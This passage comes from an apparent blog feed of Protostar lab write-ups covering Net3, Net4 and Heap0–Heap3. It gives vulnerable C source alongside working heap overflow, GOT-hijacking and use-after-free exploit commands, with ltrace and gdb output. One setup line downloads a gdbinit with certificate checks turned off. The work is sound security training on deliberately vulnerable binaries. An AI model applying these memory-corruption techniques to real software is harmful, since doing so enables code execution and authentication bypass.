}
{% endcodeblock %}</p>

<p>It is easy to solve the challenge when we understand the code. For
this purposes, we modified the source code to use a terminal for input or
output, instead of socket.</p>

<p>{% codeblock lang:c net3-modified.c %}</p>

<h1>include &lt;stdio.h></h1>

<h1>include &lt;stdlib.h></h1>

<h1>include &lt;sys/types.h></h1>

<h1>include &lt;sys/socket.h></h1>

<h1>define NAME &ldquo;net3&rdquo;</h1>

<h1>define UID 996</h1>

<h1>define GID 996</h1>

<p>/<em>
 * Extract a null terminated string from the buffer
 </em>/</p>

<p>int get_string(char <em>*result, unsigned char </em>buffer, u_int16_t len)
{
  unsigned char byte;</p>

<p>  byte = *buffer;</p>

<p>  printf(&ldquo;%d &lt; %d\n&rdquo;, byte, len);
  if(byte > len) errx(1, &ldquo;badly formed packet&rdquo;);
  <em>result = malloc(byte);
  strcpy(</em>result, buffer + 1);</p>

<p>  return byte + 1;
}</p>

<p>/<em>
 * Check to see if we can log into the host
 </em>/</p>

<p>int login(unsigned char <em>buffer, u_int16_t len)
{
  char </em>resource, <em>username, </em>password;
  int deduct;
  int success;</p>

<p>  if(len &lt; 3) errx(1, &ldquo;invalid login packet length&rdquo;);</p>

<p>  resource = username = password = NULL;</p>

<p>  deduct = get_string(&amp;resource, buffer, len);
  deduct += get_string(&amp;username, buffer+deduct, len-deduct);
  deduct += get_string(&amp;password, buffer+deduct, len-deduct);</p>

<p>  success = 0;
  success |= strcmp(resource, &ldquo;net3&rdquo;);
  success |= strcmp(username, &ldquo;awesomesauce&rdquo;);
  success |= strcmp(password, &ldquo;password&rdquo;);</p>

<p>  printf(&ldquo;success: %d\n&rdquo;, success);</p>

<p>  free(resource);
  free(username);
  free(password);</p>

<p>  return ! success;
}</p>

<p>void send_string(int fd, unsigned char byte, char *string)
{
  struct iovec v[3];
  u_int16_t len;
  int expected;</p>

<p>  len = ntohs(1 + strlen(string));</p>

<p>  v[0].iov_base = &len;
  v[0].iov_len = sizeof(len);</p>

<p>  v[1].iov_base = &byte;
  v[1].iov_len = 1;</p>

<p>  v[2].iov_base = string;
  v[2].iov_len = strlen(string);</p>

<p>  expected = sizeof(len) + 1 + strlen(string);</p>

<p>  if(writev(fd, v, 3) != expected) errx(1, &ldquo;failed to write correct amount of bytes&rdquo;);</p>

<p>}</p>

<p>void run(int fd)
{
  u_int16_t len;
  unsigned char *buffer;
  int loggedin;</p>

<p>  read(fd, &amp;len, sizeof(len));
  len = ntohs(len);
  buffer = malloc(len);</p>

<p>  if(! buffer) errx(1, &ldquo;malloc failure for %d bytes&rdquo;, len);</p>

<p>  read(fd, buffer, len);</p>

<p>  switch(buffer[0]) {
      case 23:
          loggedin = login(buffer + 1, len - 1);
          send_string(1, 33, loggedin ? &ldquo;successful&rdquo; : &ldquo;failed&rdquo;);
          break;</p>

<pre><code>  default:
      send_string(1, 58, "what you talkin about willis?");
      break;
</code></pre>

<p>  }</p>

<p>}</p>

<p>int main(int argc, char <strong>argv, char </strong>envp)
{
  int fd;
  char *username;</p>

<p>  srandom(time(NULL));</p>

<p>  run(0);
}
{% endcodeblock %}</p>

<p>After a few tries, we got:
{% codeblock %}
user@protostar:/tmp$ ruby -e &lsquo;print [30].pack(&ldquo;n&rdquo;) + 23.chr + &ldquo;\x05&rdquo; + &ldquo;net3\x00&rdquo; + &ldquo;\x0d&rdquo; +&ldquo;awesomesauce\x00&rdquo; + &ldquo;\x09&rdquo; + &ldquo;password\x00&rdquo;&rsquo; | ltrace -f ./net3-modified
[pid 27179] __libc_start_main(0x804895c, 1, 0xbffff874, 0x80489a0, 0x8048990 <unfinished ...>
[pid 27179] time(NULL)                                                                                                        = 1435334239
[pid 27179] srandom(1435334239)                                                                 = <void>
[pid 27179] read(0, &ldquo;&rdquo;, 2)                                                                      = 2
[pid 27179] ntohs(7680)                                                                         = 30
[pid 27179] malloc(30)                                                                          = 0x0804a008
[pid 27179] read(0, &ldquo;\027\005net3&rdquo;, 30)                                                         = 30
[pid 27179] printf(&ldquo;%d &lt; %d\n&rdquo;, 5, 295 &lt; 29
)                                                                                        = 7
[pid 27179] malloc(5)                                                                           = 0x0804a030
[pid 27179] strcpy(0x0804a030, &ldquo;net3&rdquo;)                                                          = 0x0804a030
[pid 27179] printf(&ldquo;%d &lt; %d\n&rdquo;, 13, 2313 &lt; 23
)                                                                                       = 8
[pid 27179] malloc(13)                                                                          = 0x0804a040
[pid 27179] strcpy(0x0804a040, &ldquo;awesomesauce&rdquo;)                                                  = 0x0804a040
[pid 27179] printf(&ldquo;%d &lt; %d\n&rdquo;, 9, 99 &lt; 9
)                                                                                         = 6
[pid 27179] malloc(9)                                                                           = 0x0804a058
[pid 27179] strcpy(0x0804a058, &ldquo;password&rdquo;)                                                      = 0x0804a058
[pid 27179] strcmp(&ldquo;net3&rdquo;, &ldquo;net3&rdquo;)                                                              = 0
[pid 27179] strcmp(&ldquo;awesomesauce&rdquo;, &ldquo;awesomesauce&rdquo;)                                              = 0
[pid 27179] strcmp(&ldquo;password&rdquo;, &ldquo;password&rdquo;)                                                      = 0
[pid 27179] printf(&ldquo;success: %d\n&rdquo;, 0success: 0
)                                                                                        = 11
[pid 27179] free(0x0804a030)                                                                    = <void>
[pid 27179] free(0x0804a040)                                                                    = <void>
[pid 27179] free(0x0804a058)                                                                    = <void>
[pid 27179] strlen(&ldquo;successful&rdquo;)                                                                = 10
[pid 27179] ntohs(11)                                                                           = 2816
[pid 27179] strlen(&ldquo;successful&rdquo;)                                                                = 10
[pid 27179] strlen(&ldquo;successful&rdquo;)                                                                = 10
[pid 27179] writev(1, 0xbffff744, 3, 0xb7f06b2c, 30
                                                   !successful)                          = 13
[pid 27179] +++ exited (status 13) +++
{% endcodeblock %}</p>

<p>{% codeblock %}
user@protostar:/tmp$ ruby -e &lsquo;print [30].pack(&ldquo;n&rdquo;) + 23.chr + &ldquo;\x05&rdquo; + &ldquo;net3\x00&rdquo; + &ldquo;\x0d&rdquo; +&ldquo;awesomesauce\x00&rdquo; + &ldquo;\x09&rdquo; + &ldquo;password\x00&rdquo;&rsquo; | ./net3-modified
5 &lt; 29
13 &lt; 23
9 &lt; 9
success: 0</p>

<p>!successful
{% endcodeblock %}</p>

<p>{% codeblock %}
user@protostar:/tmp$ ruby -e &lsquo;print [30].pack(&ldquo;n&rdquo;) + 23.chr + &ldquo;\x05&rdquo; + &ldquo;net3\x00&rdquo; + &ldquo;\x0d&rdquo; +&ldquo;awesomesauce\x00&rdquo; + &ldquo;\x09&rdquo; + &ldquo;password&rdquo;&rsquo; | nc 0 2996
!successful
{% endcodeblock %}</p>

<h2>Protostar Net4</h2>

<p>This level has only the binary without description, but after disassembling we realize, that there is nothing to solve:
{% codeblock %}
0804975a <run>:
 804975a:       55                      push   ebp
 804975b:       89 e5                   mov    ebp,esp
 804975d:       5d                      pop    ebp
 804975e:       c3                      ret  <br/>
{% endcodeblock %}</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Exploit-Exercises: Protostar (Heap Levels)]]></title>
    <link href="http://73696e65.github.io/blog/2015/07/04/exploit-exercises-protostar-heap-levels/"/>
    <updated>2015-07-04T09:29:50+02:00</updated>
    <id>http://73696e65.github.io/blog/2015/07/04/exploit-exercises-protostar-heap-levels</id>
    <content type="html"><![CDATA[<p>Image: <a href="https://www.vulnhub.com/entry/exploit-exercises-protostar-v2,32/">Exploit-Exercises: Protostar (v2)</a></p>

<p>{% codeblock %}
user@protostar:~$ wget <a href="https://raw.githubusercontent.com/73696e65/gdbinit/master/gdb_init.txt">https://raw.githubusercontent.com/73696e65/gdbinit/master/gdb_init.txt</a> &ndash;no-check-certificate -O ~/.gdbinit -q
{% endcodeblock %}</p>

<h2>Protostar Heap0</h2>

<p>{% codeblock lang:c heap0.c %}</p>

<h1>include &lt;stdlib.h></h1>

<h1>include &lt;unistd.h></h1>

<h1>include &lt;string.h></h1>

<h1>include &lt;stdio.h></h1>

<h1>include &lt;sys/types.h></h1>

<p>struct data {
  char name[64];
};</p>

<p>struct fp {
  int (*fp)();
};</p>

<p>void winner()
{
  printf(&ldquo;level passed\n&rdquo;);
}</p>

<p>void nowinner()
{
  printf(&ldquo;level has not been passed\n&rdquo;);
}</p>

<p>int main(int argc, char <em><em>argv)
{
  struct data </em>d;
  struct fp </em>f;</p>

<p>  d = malloc(sizeof(struct data));
  f = malloc(sizeof(struct fp));
  f->fp = nowinner;</p>

<p>  printf(&ldquo;data is at %p, fp is at %p\n&rdquo;, d, f);</p>

<p>  strcpy(d->name, argv[1]);</p>

<p>  f->fp();</p>

<p>}
{% endcodeblock %}</p>

<p>{% codeblock %}
user@protostar:~$ gdb -q /opt/protostar/bin/heap0
Really redefine built-in command &ldquo;frame&rdquo;? (y or n) [answered Y; input not from terminal]
Really redefine built-in command &ldquo;thread&rdquo;? (y or n) [answered Y; input not from terminal]
Really redefine built-in command &ldquo;start&rdquo;? (y or n) [answered Y; input not from terminal]
Reading symbols from /opt/protostar/bin/heap0&hellip;done.</p>

<p>gdb> r Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
data is at 0x804a008, fp is at 0x804a050</p>

<p>Program received signal SIGSEGV, Segmentation fault.</p>

<hr />

<pre><code> eax:41346341 ebx:B7FD7FF4  ecx:00000000  edx:00000065     eflags:00210246
 esi:00000000 edi:00000000  esp:BFFFF70C  ebp:BFFFF738     eip:41346341
 cs:0073  ds:007B  es:007B  fs:0000  gs:0033  ss:007B    o d I t s Z a P c 
</code></pre>

<p>[007B:BFFFF70C]&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;[stack]
BFFFF73C : 76 DC EA B7  02 00 00 00 - E4 F7 FF BF  F0 F7 FF BF v&hellip;&hellip;&hellip;&hellip;&hellip;
BFFFF72C : 50 A0 04 08  20 85 04 08 - 00 00 00 00  B8 F7 FF BF P&hellip; &hellip;&hellip;&hellip;..
BFFFF71C : 38 F7 FF BF  65 63 EC B7 - 40 10 FF B7  08 A0 04 08 8&hellip;ec..@&hellip;&hellip;.
BFFFF70C : FF 84 04 08  08 A0 04 08 - 1D F9 FF BF  50 A0 04 08 &hellip;&hellip;&hellip;&hellip;P&hellip;
[007B:41346341]&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;[ data]
41346341 : Error while running hook_stop:
Cannot access memory at address 0x41346341
0x41346341 in ?? ()
{% endcodeblock %}</p>

<p><code>0x41346341</code> represents the offset 72, also <code>0x804a050 - 0x804a008 = 72</code>. So we
write 64B to <code>d-&gt;name</code> and after another 8B, there is the address of <code>fp</code>.</p>

<p>To verify our statement, we use ltrace and gdb:</p>

<p>{% codeblock %}
user@protostar:~$ ltrace /opt/protostar/bin/heap0 1337
__libc_start_main(0x804848c, 2, 0xbffff844, 0x8048520, 0x8048510 <unfinished ...>
malloc(64)                                                      = 0x0804a008
malloc(4)                                                       = 0x0804a050
printf(&ldquo;data is at %p, fp is at %p\n&rdquo;, 0x804a008, 0x804a050data is at 0x804a008, f
)                                                                  = 41
strcpy(0x0804a008, &ldquo;1337&rdquo;)                                      = 0x0804a008
puts(&ldquo;level has not been passed&#8221;level has not been passed
)    = 26
+++ exited (status 26) +++
{% endcodeblock %}</p>

<p>{% codeblock %}
user@protostar:~$ gdb -q /opt/protostar/bin/heap0
Really redefine built-in command &ldquo;frame&rdquo;? (y or n) [answered Y; input not from terminal]
Really redefine built-in command &ldquo;thread&rdquo;? (y or n) [answered Y; input not from terminal]
Really redefine built-in command &ldquo;start&rdquo;? (y or n) [answered Y; input not from terminal]
Reading symbols from /opt/protostar/bin/heap0&hellip;done.</p>

<p>gdb> b *0x80484ff
Breakpoint 1 at 0x80484ff: file heap0/heap0.c, line 40.</p>

<p>gdb> r $(ruby -e &lsquo;print &ldquo;X&rdquo; * 64&rsquo;)
data is at 0x804a008, fp is at 0x804a050
level has not been passed</p>

<hr />

<pre><code> eax:0000001A ebx:B7FD7FF4  ecx:B7FD84C0  edx:B7FD9340     eflags:00200246
 esi:00000000 edi:00000000  esp:BFFFF730  ebp:BFFFF758     eip:080484FF
 cs:0073  ds:007B  es:007B  fs:0000  gs:0033  ss:007B    o d I t s Z a P c 
</code></pre>

<p>[007B:BFFFF730]&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;[stack]
BFFFF760 : 02 00 00 00  04 F8 FF BF - 10 F8 FF BF  48 18 FE B7 &hellip;&hellip;&hellip;&hellip;H&hellip;
BFFFF750 : 20 85 04 08  00 00 00 00 - D8 F7 FF BF  76 DC EA B7  &hellip;&hellip;&hellip;..v&hellip;
BFFFF740 : 65 63 EC B7  40 10 FF B7 - 08 A0 04 08  50 A0 04 08 ec..@&hellip;&hellip;.P&hellip;
BFFFF730 : 08 A0 04 08  41 F9 FF BF - 50 A0 04 08  58 F7 FF BF &hellip;.A&hellip;P&hellip;X&hellip;
[007B:BFFFF730]&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;[ data]
BFFFF730 : 08 A0 04 08  41 F9 FF BF - 50 A0 04 08  58 F7 FF BF &hellip;.A&hellip;P&hellip;X&hellip;
BFFFF740 : 65 63 EC B7  40 10 FF B7 - 08 A0 04 08  50 A0 04 08 ec..@&hellip;&hellip;.P&hellip;
[0073:080484FF]&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;[ code]
0x80484ff &lt;main+115>:   leave<br/>
0x8048500 &lt;main+116>:   ret  <br/>
0x8048501:  nop
0x8048502:  nop
0x8048503:  nop</p>

<h2>0x8048504:  nop</h2>

<p>Breakpoint 1, main (argc=0x2, argv=0xbffff804) at heap0/heap0.c:40
40  heap0/heap0.c: No such file or directory.
    in heap0/heap0.c</p>

<p>gdb> x /25x 0x0804a000
0x804a000:  0x00000000  0x00000049  0x58585858  0x58585858
0x804a010:  0x58585858  0x58585858  0x58585858  0x58585858
0x804a020:  0x58585858  0x58585858  0x58585858  0x58585858
0x804a030:  0x58585858  0x58585858  0x58585858  0x58585858
0x804a040:  0x58585858  0x58585858  0x00000000  0x00000011
0x804a050:  0x08048478  0x00000000  0x00000000  0x00020fa9
0x804a060:  0x00000000
{% endcodeblock %}</p>

<p>{% codeblock %}
(08) 0x0804a000: d-control
(64) 0x0804a008: d-name</p>

<p>(08) 0x0804a048: f-control
(04) 0x0804a050: f-fp
{% endcodeblock %}</p>

<p>We set <code>fp</code> to <code>winner()</code> symbol:</p>

<p>{% codeblock %}
user@protostar:~$ nm /opt/protostar/bin/heap0 | grep winner
08048478 T nowinner
08048464 T winner</p>

<p>user@protostar:~$ /opt/protostar/bin/heap0 $(ruby -e &lsquo;print &ldquo;X&rdquo;*72 + [0x08048464].pack(&ldquo;V&rdquo;)&rsquo;)
data is at 0x804a008, fp is at 0x804a050
level passed
{% endcodeblock %}</p>

<h2>Protostar Heap1</h2>

<p>{% codeblock lang:c heap1.c %}</p>

<h1>include &lt;stdlib.h></h1>

<h1>include &lt;unistd.h></h1>

<h1>include &lt;string.h></h1>

<h1>include &lt;stdio.h></h1>

<h1>include &lt;sys/types.h></h1>

<p>struct internet {
  int priority;
  char *name;
};</p>

<p>void winner()
{
  printf(&ldquo;and we have a winner @ %d\n&rdquo;, time(NULL));
}</p>

<p>int main(int argc, char <em><em>argv)
{
  struct internet </em>i1, </em>i2, *i3;</p>

<p>  i1 = malloc(sizeof(struct internet));
  i1->priority = 1;
  i1->name = malloc(8);</p>

<p>  i2 = malloc(sizeof(struct internet));
  i2->priority = 2;
  i2->name = malloc(8);</p>

<p>  strcpy(i1->name, argv[1]);
  strcpy(i2->name, argv[2]);</p>

<p>  printf(&ldquo;and that&rsquo;s a wrap folks!\n&rdquo;);
}</p>

<p>{% endcodeblock %}</p>

<p>{% codeblock %}
user@protostar:~$ ltrace /opt/protostar/bin/heap1 AAAA BBBB
__libc_start_main(0x80484b9, 3, 0xbffff834, 0x8048580, 0x8048570 <unfinished ...>
malloc(8)                        = 0x0804a008
malloc(8)                        = 0x0804a018
malloc(8)                        = 0x0804a028
malloc(8)                        = 0x0804a038
strcpy(0x0804a018, &ldquo;AAAA&rdquo;)       = 0x0804a018
strcpy(0x0804a038, &ldquo;BBBB&rdquo;)       = 0x0804a038
puts(&ldquo;and that&rsquo;s a wrap folks!&#8221;and that&rsquo;s a wrap folks!
)                   = 25
+++ exited (status 25) +++
{% endcodeblock %}</p>

<p>We have four allocated chunks in memory:
{% codeblock %}
(8) 0x0804a000: i1-control
(4) 0x0804a008: i1-priority
(4) 0x0804a00c: i1-name(addr)</p>

<p>(8) 0x0804a010: i1-name-control
(8) 0x0804a018: i1-name</p>

<p>(8) 0x0804a020: i2-control
(4) 0x0804a028: i2-priority
(4) 0x0804a02c: i2-name(addr)</p>

<p>(8) 0x0804a030: i2-name-control
(8) 0x0804a038: i2-name
{% endcodeblock %}</p>

<p>After 20 bytes, we are able to change <code>i2-name(addr)</code>, that is used by second <code>strcpy()</code>.</p>

<p>{% codeblock %}
user@protostar:~$ ltrace -e strcpy /opt/protostar/bin/heap1 $(ruby -e &lsquo;print &ldquo;A&rdquo; * 20 + [0x44444444].pack(&ldquo;V&rdquo;) &rsquo;) 2222
strcpy(0x0804a018, &ldquo;AAAAAAAAAAAAAAAAAAAADDDD&rdquo;)      = 0x0804a018
strcpy(0x44444444, &ldquo;2222&rdquo; <unfinished ...>
&mdash; SIGSEGV (Segmentation fault) &mdash;
+++ killed by SIGSEGV +++
{% endcodeblock %}</p>

<p>We use <code>Global Offset Table Hijacking</code> technique:
{% codeblock %}
user@protostar:~$ objdump -TR /opt/protostar/bin/heap1</p>

<p>/opt/protostar/bin/heap1:     file format elf32-i386</p>

<p>DYNAMIC SYMBOL TABLE:
00000000  w   D  <em>UND</em>  00000000              <strong>gmon_start</strong>
00000000      DF <em>UND</em>  00000000  GLIBC_2.0   <em>_libc_start_main
00000000      DF <em>UND</em>  00000000  GLIBC_2.0   strcpy
00000000      DF <em>UND</em>  00000000  GLIBC_2.0   printf
00000000      DF <em>UND</em>  00000000  GLIBC_2.0   time
00000000      DF <em>UND</em>  00000000  GLIBC_2.0   malloc
00000000      DF <em>UND</em>  00000000  GLIBC_2.0   puts
0804862c g    DO .rodata    00000004  Base        </em>IO_stdin_used</p>

<p>DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE
0804974c R_386_GLOB_DAT    <strong>gmon_start</strong>
0804975c R_386_JUMP_SLOT   <strong>gmon_start</strong>
08049760 R_386_JUMP_SLOT   __libc_start_main
08049764 R_386_JUMP_SLOT   strcpy
08049768 R_386_JUMP_SLOT   printf
0804976c R_386_JUMP_SLOT   time
08049770 R_386_JUMP_SLOT   malloc
08049774 R_386_JUMP_SLOT   puts</p>

<p>user@protostar:~$ nm /opt/protostar/bin/heap1 | grep winner
08048494 T winner
{% endcodeblock %}</p>

<p>Goal is to write the value <code>0x08048494</code> to the <code>0x08049774</code> address.</p>

<p>{% codeblock %}
strcpy(i1->name, argv[1]):
(8) 0x0804a000: i1-control
(4) 0x0804a008: i1-priority
(4) 0x0804a00c: i1-name(addr)</p>

<p>(8) 0x0804a010: i1-name-control
(8) 0x0804a018: i1-name             # AAAAAAAA</p>

<p>(8) 0x0804a020: i2-control          # AAAAAAAA
(4) 0x0804a028: i2-priority         # AAAA
(4) 0x0804a02c: i2-name(addr)       # [0x08049774].pack(&ldquo;V&rdquo;)</p>

<p>(8) 0x0804a030: i2-name-control   <br/>
(8) 0x0804a038: i2-name</p>

<p>strcpy(i2->name, argv[2]):
(8) 0x0804a000: i1-control
(4) 0x0804a008: i1-priority
(4) 0x0804a00c: i1-name(addr)</p>

<p>(8) 0x0804a010: i1-name-control
(8) 0x0804a018: i1-name             # AAAAAAAA</p>

<p>(8) 0x0804a020: i2-control          # AAAAAAAA
(4) 0x0804a028: i2-priority         # AAAA
(4) 0x0804a02c: i2-name(addr)       # [0x08049774].pack(&ldquo;V&rdquo;)</p>

<p>(8) 0x0804a030: i2-name-control
(8) 0x0804a038: i2-name             # [0x08048494].pack(&ldquo;V&rdquo;)
{% endcodeblock %}</p>

<p>The second <code>strcpy()</code> takes <code>i2-name(addr) = 0x08049774</code> and copies over there the <code>argv[2]</code> value.</p>

<p>{% codeblock %}
user@protostar:~$ ltrace /opt/protostar/bin/heap1 $(ruby -e &lsquo;print &ldquo;A&rdquo; * 20 + [0x08049774].pack(&ldquo;V&rdquo;)&rsquo;) $(ruby -e &lsquo;print [0x08048494].pack(&ldquo;V&rdquo;)&rsquo;)
__libc_start_main(0x80484b9, 3, 0xbffff824, 0x8048580, 0x8048570 <unfinished ...>
malloc(8)                                                   = 0x0804a008
malloc(8)                                                   = 0x0804a018
malloc(8)                                                   = 0x0804a028
malloc(8)                                                   = 0x0804a038
strcpy(0x0804a018, &ldquo;AAAAAAAAAAAAAAAAAAAAt\227\004\b&rdquo;)       = 0x0804a018
strcpy(0x08049774, &ldquo;\224\204\004\b&rdquo;)                        = 0x08049774
puts(&ldquo;and that&rsquo;s a wrap folks!&rdquo; <unfinished ...>
time(NULL)                                                  = 1435153654
printf(&ldquo;and we have a winner @ %d\n&rdquo;, 1435153654and we have a winner @ 1435153654
)                                                                             = 34
&lt;&hellip; puts resumed> )                                                                                                          = 34
+++ exited (status 34) +++
{% endcodeblock %}</p>

<p>{% codeblock %}
user@protostar:~$ /opt/protostar/bin/heap1 $(ruby -e &lsquo;print &ldquo;A&rdquo; * 20 + [0x08049774].pack(&ldquo;V&rdquo;)&rsquo;) $(ruby -e &lsquo;print [0x08048494].pack(&ldquo;V&rdquo;)&rsquo;)
and we have a winner @ 1435149585
{% endcodeblock %}</p>

<h2>Protostar Heap2</h2>

<p>{% codeblock lang:c heap2.c %}</p>

<h1>include &lt;stdlib.h></h1>

<h1>include &lt;unistd.h></h1>

<h1>include &lt;string.h></h1>

<h1>include &lt;sys/types.h></h1>

<h1>include &lt;stdio.h></h1>

<p>struct auth {
  char name[32];
  int auth;
};</p>

<p>struct auth <em>auth;
char </em>service;</p>

<p>int main(int argc, char **argv)
{
  char line[128];</p>

<p>  while(1) {
      printf(&ldquo;[ auth = %p, service = %p ]\n&rdquo;, auth, service);</p>

<pre><code>  if(fgets(line, sizeof(line), stdin) == NULL) break;

  if(strncmp(line, "auth ", 5) == 0) {
      auth = malloc(sizeof(auth));
      memset(auth, 0, sizeof(auth));
      if(strlen(line + 5) &lt; 31) {
          strcpy(auth-&gt;name, line + 5);
      }
  }
  if(strncmp(line, "reset", 5) == 0) {
      free(auth);
  }
  if(strncmp(line, "service", 6) == 0) {
      service = strdup(line + 7);
  }
  if(strncmp(line, "login", 5) == 0) {
      if(auth-&gt;auth) {
          printf("you have logged in already!\n");
      } else {
          printf("please enter your password\n");
      }
  }
</code></pre>

<p>  }
}
{% endcodeblock %}</p>

<p>Running the binary:
{% codeblock %}
user@protostar:~$ /opt/protostar/bin/heap2
[ auth = (nil), service = (nil) ]
auth 1234
[ auth = 0x804c008, service = (nil) ]
service 5678
[ auth = 0x804c008, service = 0x804c018 ]
login
please enter your password
[ auth = 0x804c008, service = 0x804c018 ]
{% endcodeblock %}</p>

<p>This is strange, the <code>service</code> variable is allocated at <code>0x0804c018</code>, but
obviously we cannot have the following heap chucks:</p>

<p>{% codeblock %}
(08) 0x0804c000: auth-control
(32) 0x0804c008: auth-name
(04) 0x0804c028: auth-auth</p>

<p>(08) 0x0804c010: service-control
(xx) 0x0804c018: service
{% endcodeblock %}</p>

<p>There should be <code>sizeof(struct auth) = 32+4</code> instead of <code>sizeof(auth) = 4</code> and in
our buggy code we allocated only four bytes of memory:</p>

<p>{% codeblock %}
auth = malloc(sizeof(auth));
memset(auth, 0, sizeof(auth));
{% endcodeblock %}</p>

<p>This is very simple <code>Use-After-Free</code> vulnerability. We need to write something
to <code>auth-auth</code>, after <code>0x0804c028-0x0804c018 = 16</code> bytes.</p>

<p>{% codeblock %}
user@protostar:~$ ltrace /opt/protostar/bin/heap2
__libc_start_main(0x8048934, 1, 0xbffff864, 0x804acc0, 0x804acb0 <unfinished ...>
printf(&ldquo;[ auth = %p, service = %p ]\n&rdquo;, (nil), (nil)[ auth = (nil), service = (nil) ]
)                                                                         = 34
fgets(auth A
&ldquo;auth A\n&rdquo;, 128, 0xb7fd8420)                                                                                            = 0xbffff730
strncmp(&ldquo;auth A\n&rdquo;, &ldquo;auth &rdquo;, 5)                                                                                               = 0
sysconf(30, 0, 0xb7fe1b28, 1, 0)                                                                                              = 4096
sbrk(4096)                                                                                                                    = 0x0804c000
sbrk(0)                                                                                                                       = 0x0804d000
memset(0x0804c008, &lsquo;\000&rsquo;, 4)                                                                                                 = 0x0804c008
strlen(&ldquo;A\n&rdquo;)                                                                                                                 = 2
strcpy(0x0804c008, &ldquo;A\n&rdquo;)                                                                                                     = 0x0804c008
strncmp(&ldquo;auth A\n&rdquo;, &ldquo;reset&rdquo;, 5)                                                                                               = -17
strncmp(&ldquo;auth A\n&rdquo;, &ldquo;service&rdquo;, 6)                                                                                             = -18
strncmp(&ldquo;auth A\n&rdquo;, &ldquo;login&rdquo;, 5)                                                                                               = -11
printf(&ldquo;[ auth = %p, service = %p ]\n&rdquo;, 0x804c008, (nil)[ auth = 0x804c008, service = (nil) ]
)                                                                     = 38
fgets(service AAAAAAAAAAAAAAA
&ldquo;service AAAAAAAAAAAAAAA\n&rdquo;, 128, 0xb7fd8420)                                                                           = 0xbffff730
strncmp(&ldquo;service AAAAAAAAAAAAAAA\n&rdquo;, &ldquo;auth &rdquo;, 5)                                                                              = 18
strncmp(&ldquo;service AAAAAAAAAAAAAAA\n&rdquo;, &ldquo;reset&rdquo;, 5)                                                                              = 1
strncmp(&ldquo;service AAAAAAAAAAAAAAA\n&rdquo;, &ldquo;service&rdquo;, 6)                                                                            = 0
strdup(&ldquo; AAAAAAAAAAAAAAA\n&rdquo;)                                                                                                  = 0x0804c018
strncmp(&ldquo;service AAAAAAAAAAAAAAA\n&rdquo;, &ldquo;login&rdquo;, 5)                                                                              = 7
printf(&ldquo;[ auth = %p, service = %p ]\n&rdquo;, 0x804c008, 0x804c018[ auth = 0x804c008, service = 0x804c018 ]
)                                                                 = 42
fgets(login
&ldquo;login\n&rdquo;, 128, 0xb7fd8420)                                                                                             = 0xbffff730
strncmp(&ldquo;login\n&rdquo;, &ldquo;auth &rdquo;, 5)                                                                                                = 11
strncmp(&ldquo;login\n&rdquo;, &ldquo;reset&rdquo;, 5)                                                                                                = -6
strncmp(&ldquo;login\n&rdquo;, &ldquo;service&rdquo;, 6)                                                                                              = -7
strncmp(&ldquo;login\n&rdquo;, &ldquo;login&rdquo;, 5)                                                                                                = 0
puts(&ldquo;you have logged in already!&#8221;you have logged in already!
)                                                                                           = 28
printf(&rdquo;[ auth = %p, service = %p ]\n&#8221;, 0x804c008, 0x804c018[ auth = 0x804c008, service = 0x804c018 ]
)                                                                 = 42
fgets(&ldquo;login\n&rdquo;, 128, 0xb7fd8420)                                                                                             = NULL
+++ exited (status 0) +++
{% endcodeblock %}</p>

<p>As we can see above, we sent 15 character + newline.</p>

<p>{% codeblock %}
user@protostar:~$ /opt/protostar/bin/heap2
[ auth = (nil), service = (nil) ]
auth A
[ auth = 0x804c008, service = (nil) ]
service AAAAAAAAAAAAAAA
[ auth = 0x804c008, service = 0x804c018 ]
login
you have logged in already!
[ auth = 0x804c008, service = 0x804c018 ]</p>

<p>user@protostar:~$ ruby -e &lsquo;puts &ldquo;auth A&rdquo;; puts &ldquo;service &rdquo; + &ldquo;A&rdquo; * 15; puts &ldquo;login&rdquo;&rsquo; | /opt/protostar/bin/heap2
[ auth = (nil), service = (nil) ]
[ auth = 0x804c008, service = (nil) ]
[ auth = 0x804c008, service = 0x804c018 ]
you have logged in already!
[ auth = 0x804c008, service = 0x804c018 ]
{% endcodeblock %}</p>

<h2>Protostar Heap3</h2>

<p>This level introduces old <code>Doug Lea Malloc</code> version, which is statically linked with <code>heap3</code> binary.</p>

<p>{% codeblock lang:c heap3.c %}</p>

<h1>include &lt;stdlib.h></h1>

<h1>include &lt;unistd.h></h1>

<h1>include &lt;string.h></h1>

<h1>include &lt;sys/types.h></h1>

<h1>include &lt;stdio.h></h1>

<p>void winner()
{
  printf(&ldquo;that wasn&rsquo;t too bad now, was it? @ %d\n&rdquo;, time(NULL));
}</p>

<p>int main(int argc, char <em><em>argv)
{
  char </em>a, </em>b, *c;</p>

<p>  a = malloc(32);
  b = malloc(32);
  c = malloc(32);</p>

<p>  strcpy(a, argv[1]);
  strcpy(b, argv[2]);
  strcpy(c, argv[3]);</p>

<p>  free&copy;;
  free(b);
  free(a);</p>

<p>  printf(&ldquo;dynamite failed?\n&rdquo;);
}
{% endcodeblock %}</p>

<p>{% codeblock %}
user@protostar:~$ ltrace /opt/protostar/bin/heap3 1 2 3
__libc_start_main(0x8048889, 4, 0xbffff854, 0x804ab50, 0x804ab40 <unfinished ...>
sysconf(30, 0xb7ffeff4, 0xb7e9abb8, 1, 0xbffff71c)             = 4096
